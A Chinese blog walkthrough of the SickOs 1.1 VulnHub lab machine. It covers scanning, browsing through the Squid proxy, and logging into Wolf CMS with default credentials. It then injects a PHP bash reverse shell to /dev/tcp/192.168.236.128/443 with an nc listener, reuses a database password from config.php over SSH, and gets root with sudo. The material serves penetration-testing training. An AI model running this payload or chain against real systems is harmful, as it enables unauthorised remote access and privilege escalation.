
# Sickos1\.1 详细靶机思路 实操笔记


#### 免责声明


本博客提供的所有信息仅供学习和研究目的，旨在提高读者的网络安全意识和技术能力。请在合法合规的前提下使用本文中提供的任何技术、方法或工具。如果您选择使用本博客中的任何信息进行非法活动，您将独自承担全部法律责任。本博客明确表示不支持、不鼓励也不参与任何形式的非法活动。


#### 前言


这台靶机比较简单，有一定经验的师傅们建议可以直接盲打，如果遇到走不通的话再看网上的各种分享，主要可能想不到的点在squid代理服务，通过查询相关资料能得知我们通过配置代理就能突破这个点


**下载靶机**
靶机链接[SickOs: 1\.1 \~ VulnHub](https://github.com)下来后导入到vmware里面


右键vm靶机栏 打开靶机的.ovf文件


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114533867-2018901021.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114533867-2018901021.png)


## Nmap信息收集


主机发现：



```
sudo nmap -sn 192.168.236.128/24
```

开启靶机后能找到133这台机器，就是我们要打的靶机


### TCP扫描



```
sudo nmap -sT --min-rate 10000 -p- -oA sickok_ports 192.168.236.133
```

[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114542944-1914588781.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114542944-1914588781.png)


拿到了这三个端口22,3128,8080 对应的端口分别为ssh squid\-http http\-proxy


### 详细端口扫描



```
nmap -sT --min-rate 10000 -p 22,3128,8080 -O -sV -sC -oA sickos_detail 192.168.236.133
```

[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114550072-920139926.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114550072-920139926.png)


给出了更详细的信息，如服务版本号，主机型号等


### nmap默认漏洞脚本扫描



```
nmap --script=vuln -oA sickos_script p22,8080,3128 192.168.236.133
```

[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114557035-1531411965.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114557035-1531411965.png)


没有什么发现，nmap没有给出利用路径


## web渗透


### 攻击面分析


我们知道了3128开放的是一个squid代理服务，版本为3\.1\.19，如下直接访问没有给什么东西


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114605741-1833205850.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114605741-1833205850.png)


8080端口关闭，是一个http\-proxy 可能是什么代理之类的服务，直接去访问是拒绝连接


22端口ssh远程连接我们可以尝试去空密码连接，但可能性不大，如果在我们去寻找凭据实在走不下去了可以去尝试一下


### squid代理


先去搜索一下squid服务



> **Squid代理服务器**
> Squid主要提供缓存加速、应用层过滤控制、web服务隐藏真实IP（安全性）的功能。
> 1、代理的工作机制
> 代替客户机向网站请求数据，从而可以隐藏用户的真实IP地址。
> 将获得的网页数据（静态 Web 元素）保存到缓存中并发送给客户机，以便下次请求相同的数据时快速响应。
> 2、代理的类型
> 传统代理：
> 
> 
> 适用于Internet，需在客户机指定代理服务器的地址和端口。
> 透明代理：
> 
> 
> 客户机不需指定代理服务器的地址和端口，而是通过默认路由、防火墙策略将Web访问重定向给代理服务器处理。
> 反向代理：
> 
> 
> 如果 Squid 反向代理服务器中缓存了该请求的资源，则将该请求的资源直接返回给客户端；否则反向代理服务器将向后台的 WEB 服务器请求资源，然后将请求的应答返回给客户端，同时也将该应答缓存（静态）在本地，供下一个请求者使用。


靶机的squid跑在3128端口上，应该指定的代理服务器端口就为3128，在浏览器上设置一下proxy


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114613098-529184508.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114613098-529184508.png)


设置好后发现直接访问靶机ip可以通，给了一个BLEHHH！！！ 这是一个俚语


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114623042-11848584.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114623042-11848584.png)


既然可以通那就爆破一下目录吧


指定一下代理



```
dirb http://192.168.236.133/ -p http://192.168.236.133:3128/
```

[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114637341-658743326.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114637341-658743326.png)



```
+ http://192.168.236.133/cgi-bin/ (CODE:403|SIZE:291)                                                                                                     
+ http://192.168.236.133/connect (CODE:200|SIZE:109)                                                                                                      
+ http://192.168.236.133/index (CODE:200|SIZE:21)                                                                                                         
+ http://192.168.236.133/index.php (CODE:200|SIZE:21)                                                                                                     
+ http://192.168.236.133/robots (CODE:200|SIZE:45)                                                                                                        
+ http://192.168.236.133/robots.txt (CODE:200|SIZE:45)                                                                                            
+ http://192.168.236.133/server-status (CODE:403|SIZE:296)  
```

先访问最感兴趣的index.php


其实就是之前的BLEHHHH！！


其他的目录扫了一眼，/connect里面是一个脚本，没什么用大概就是说 你可能想要尝试（利用）我的服务


/server\-status 403forbidden无法访问



```
#!/usr/bin/python

print("I Try to connect things very frequently")
print("You may want to try my services")
```

robots.txt :


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114649747-1195912403.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114649747-1195912403.png)


给了一个Dissalow：/wolfcms，尝试一下访问这个路由，尝试访问发现真的有


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114654684-1182468691.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114654684-1182468691.png)


点了一圈没有什么发现，网页都是一些静态资源，去网上搜索一下wolfcms有没有什么框架漏洞


[Wolf CMS \- Arbitrary File Upload / Execution \- PHP webapps Exploit](https://github.com)


这里发现一个长得很像登陆界面的url


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114702205-269121005.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114702205-269121005.png)



```
http://targetsite.com/wolfcms/?/admin/plugin/file_manager/browse/
```

确实跳转到了一个登录页


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114709385-293052887.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114709385-293052887.png)


弱密码U/P：admin admin进入wolfcms的后台


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114720121-1276733372.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114720121-1276733372.png)


### 反向连接shell


在登录wolfcms后台之后随便点点，发现有很多代码执行和文件上传的位置，比如Home Page里面就可以填写php代码


在Articles中嵌入



```
php</span exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.236.128/443 0>&1'");?>
```

来分析一下这个反向连接shell


`exec()` php的内置函数，用于执行外部程序 基础语法：exec(command,output,return\_var) (命令，存储命令的输出，返回状态码)


`/bin/bash` Linux系统中的Bash shell的路径 /bin/bash是Bash shell的可执行文件


`-c`这是Bash的一个选项，表示后面跟着的字符串会被当作一个命令来执行


`'bash -i >& /dev/tcp/192.168.236.128/443 0>&1'`这个字符串是传递给Bash的命令。我们再进一步解析：


`bash -i`


`bash`：启动一个新的Bash shell。`-i`：表示以交互模式运行Bash shell。


`>&`：这是一个重定向操作符，用于将标准输出（stdout）和标准错误（stderr）合并并重定向到指定的目标。


`/dev/tcp/192.168.236.128/443`：这是一个特殊的文件描述符，表示通过TCP协议连接到IP地址为 `192.168.236.128` 的主机，端口为 `443`。


**`0>&1`**


`0`：表示标准输入（stdin）。


`>&1`：表示将标准输入（stdin）重定向到标准输出（stdout）的文件描述符。


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114735091-2051997584.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114735091-2051997584.png)


嵌入，保存后在kali上开启监听



```
sudo nc -lvnp 443
```

[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114739909-1834985710.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114739909-1834985710.png)


再去访问Artical 反弹shell成功


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114745911-2053286879.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114745911-2053286879.png)


## 提权


### 信息收集


先看一下得到的权限能干什么，有什么权限，在这个权限下能看到的文件等信息，这里我建议最好把整个shell的所有能访问到的东西都先浏览一遍，把他的文件结构都搞清楚，要知道他有没有什么可以访问的配置文件config等，/etc/passwd这种重要的目录也要去尝试一下有没有权限打开，里面是否有我们感兴趣的内容



```
whoami
```

可以看到现在的用户是www\-data


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114751271-1076884816.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114751271-1076884816.png)


尝试访问/etc/passwd 发现root和sickos这两个账户是拥有bash环境的，而我们所在的www\-data是没有的，所以如果我们找到凭据应该优先尝试这两个账户。


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114801283-735128698.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114801283-735128698.png)



```
ls -alh
```

能看到有一个config.php配置文件 ，得到了一个凭据john@123 这里还给了一个mysql的用户名，但是这个机器没开3389，没有实际意义 ，得到的这个凭据，可以结合上面得到的两个账号，尝试一下ssh连接，如果可以就成功提权了



```
php</span 

// Database information:
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
// The path can only be absolute path or :memory:
// For more info look at: www.php.net/pdo

// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');

// Should Wolf produce PHP error messages for debugging?
define('DEBUG', false);

// Should Wolf check for updates on Wolf itself and the installed plugins?
define('CHECK_UPDATES', true);

// The number of seconds before the check for a new Wolf version times out in case of problems.
define('CHECK_TIMEOUT', 3);

// The full URL of your Wolf CMS install
define('URL_PUBLIC', '/wolfcms/');

// Use httpS for the backend?
// Before enabling this, please make sure you have a working HTTP+SSL installation.
define('USE_HTTPS', false);

// Use HTTP ONLY setting for the Wolf CMS authentication cookie?
// This requests browsers to make the cookie only available through HTTP, so not javascript for example.
// Defaults to false for backwards compatibility.
define('COOKIE_HTTP_ONLY', false);

// The virtual directory name for your Wolf CMS administration section.
define('ADMIN_DIR', 'admin');

// Change this setting to enable mod_rewrite. Set to "true" to remove the "?" in the URL.
// To enable mod_rewrite, you must also change the name of "_.htaccess" in your
// Wolf CMS root directory to ".htaccess"
define('USE_MOD_REWRITE', false);

// Add a suffix to pages (simluating static pages '.html')
define('URL_SUFFIX', '.html');

// Set the timezone of your choice.
// Go here for more information on the available timezones:
// http://php.net/timezones
define('DEFAULT_TIMEZONE', 'Asia/Calcutta');

// Use poormans cron solution instead of real one.
// Only use if cron is truly not available, this works better in terms of timing
// if you have a lot of traffic.
define('USE_POORMANSCRON', false);

// Rough interval in seconds at which poormans cron should trigger.
// No traffic == no poormans cron run.
define('POORMANSCRON_INTERVAL', 3600);

// How long should the browser remember logged in user?
// This relates to Login screen "Remember me for xxx time" checkbox at Backend Login screen
// Default: 1800 (30 minutes)
define ('COOKIE_LIFE', 1800);  // 30 minutes

// Can registered users login to backend using their email address?
// Default: false
define ('ALLOW_LOGIN_WITH_EMAIL', false);

// Should Wolf CMS block login ability on invalid password provided?
// Default: true
define ('DELAY_ON_INVALID_LOGIN', true);

// How long should the login blockade last?
// Default: 30 seconds
define ('DELAY_ONCE_EVERY', 30); // 30 seconds

// First delay starts after Nth failed login attempt
// Default: 3
define ('DELAY_FIRST_AFTER', 3);

// Secure token expiry time (prevents CSRF attacks, etc.)
// If backend user does nothing for this time (eg. click some link) 
// his token will expire with appropriate notification
// Default: 900 (15 minutes)
define ('SECURE_TOKEN_EXPIRY', 900);  // 15 minutes
```

看到别人的博客，还找到了这个路径下的配置文件



```
cat /var/www/wolfcms/wolf/plugins/backup_restore/views/settings.php
```

里面有一个密码[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114816632-1275453266.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114816632-1275453266.png):[veee加速器](https://liuyunzhuge.com)
但实际好像并没有什么用处


### ssh


尝试`sickos root` `john@123 pawpsw123`这一组凭据


这一组可以连接



```
ssh sickos@192.168.236.133

john@123
```

sudo \-l查看一下拿到的shell的权限


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114827644-1667387978.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114827644-1667387978.png)


有sudo权限，可以运行任何命令（ALL：ALL） 也就是可以用sudo命令提升到root权限


那就直接切换root用户



```
sudo /bin/bash
```

成功提权，root目录下有flag


[![](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114834536-65449191.png)](https://img2024.cnblogs.com/blog/3409507/202411/3409507-20241123114834536-65449191.png)


成功通关sickos


  * [Sickos1\.1 详细靶机思路 实操笔记](#sickos11-%E8%AF%A6%E7%BB%86%E9%9D%B6%E6%9C%BA%E6%80%9D%E8%B7%AF--%E5%AE%9E%E6%93%8D%E7%AC%94%E8%AE%B0)
* [免责声明](#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E)
* [前言](#%E5%89%8D%E8%A8%80)
* [Nmap信息收集](#nmap%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)
* [TCP扫描](#tcp%E6%89%AB%E6%8F%8F)
* [详细端口扫描](#%E8%AF%A6%E7%BB%86%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F)
* [nmap默认漏洞脚本扫描](#nmap%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F)
* [web渗透](#web%E6%B8%97%E9%80%8F)
* [攻击面分析](#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90)
* [squid代理](#squid%E4%BB%A3%E7%90%86)
* [反向连接shell](#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5shell)
* [提权](#%E6%8F%90%E6%9D%83)
* [信息收集](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)
* [ssh](#ssh)

   \_\_EOF\_\_

   ![](https://github.com/Sol9)Sol ’ blog  - **本文链接：** [https://github.com/Sol9/p/18564287](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 除特殊说明外，转载请注明出处～\[知识共享署名\-相同方式共享 4\.0 国际许可协议]
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
